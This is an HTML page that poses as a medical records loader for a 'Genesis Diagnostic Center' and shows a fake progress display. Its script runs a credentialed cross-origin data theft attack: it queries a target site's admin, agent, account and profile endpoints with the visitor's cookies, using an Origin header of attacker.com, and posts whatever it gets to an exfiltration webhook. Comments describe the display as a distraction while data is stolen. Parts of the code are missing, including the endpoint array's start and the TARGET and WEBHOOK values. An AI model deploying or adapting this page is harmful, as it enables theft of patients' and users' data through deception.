<!DOCTYPE html>
<html>
<head>
    <title>Genesis Diagnostic Center</title>
    <meta charset="UTF-8">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 50px;
            max-width: 500px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }
        .logo {
            font-size: 48px;
            margin-bottom: 10px;
        }
        h1 { color: #2d3748; margin-bottom: 10px; }
        .subtitle { color: #718096; margin-bottom: 30px; }
        .progress-bar {
            width: 100%;
            height: 6px;
            background: #e2e8f0;
            border-radius: 3px;
            overflow: hidden;
            margin: 20px 0;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #667eea, #764ba2);
            width: 0%;
            animation: progress 3s ease-in-out infinite;
        }
        @keyframes progress {
            0% { width: 0%; }
            50% { width: 70%; }
            100% { width: 100%; }
        }
        .status { 
            color: #4a5568;
            font-size: 14px;
            margin-top: 10px;
        }
        .footer {
            margin-top: 30px;
            color: #a0aec0;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🏥</div>
        <h1>Genesis Diagnostic Center</h1>
        <p class="subtitle">Loading your medical records...</p>
        <div class="progress-bar">
            <div class="progress-fill"></div>
        </div>
        <div class="status" id="status">🔍 Scanning for patient data</div>
        <div class="footer">Secure connection • HIPAA Compliant</div>
    </div>

    <script>

            const status = document.getElementById('status');
            
            // Function to simulate loading (keeps user entertained while stealing data)
            function updateStatus(text, delay = 1000) {
                return new Promise(resolve => {
                    setTimeout(() => {
                        status.textContent = text;
                        resolve();
                    }, delay);
                });
            }
            
            async function stealData() {

                    '/api/users?role=admin&sortBy=name&descending=false&rowsNumber=0&rowsPerPage=100',
                    '/api/agents?sortBy=name&descending=false',
                    '/api/accountDetails',
                    '/api/profile'
                ];
                
                let stolenData = [];
                
                for (let endpoint of endpoints) {
                    await updateStatus(`🔍 Querying: ${endpoint.split('?')[0]}`);
                    
                    try {
                        const response = await fetch(TARGET + endpoint, {
                            credentials: 'include',
                            headers: {
                                'Origin': 'https://attacker.com',
                                'Accept': 'application/json'
                            }
                        });
                        
                        if (response.status === 200) {
                            const data = await response.json();
                            if (data.data && data.data.length > 0) {
                                stolenData.push({
                                    endpoint: endpoint,
                                    count: data.data.length,
                                    data: data
                                });
                            }
                        }
                    } catch(e) {
                        // Silent fail
                    }
                }
                
                // Send all stolen data
                if (stolenData.length > 0) {
                    await updateStatus(`📤 Exfiltrating ${stolenData.length} datasets...`);
                    
                    for (let item of stolenData) {
                        try {
                            await fetch(WEBHOOK, {
                                method: 'POST',
                                mode: 'no-cors',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    timestamp: new Date().toISOString(),
                                    victim: window.location.href,
                                    userAgent: navigator.userAgent,
                                    ...item
                                })
                            });
                        } catch(e) {}
                    }
                    
                    await updateStatus(`✅ ${stolenData.length} datasets exported successfully`);
                } else {
                    await updateStatus(`⚠️ No data found - please login`);
                }
            }
            
            // Start the attack after a delay (looks more legitimate)
            setTimeout(() => {
                stealData();
            }, 2000);
        })();
    </script>
</body>
</html>
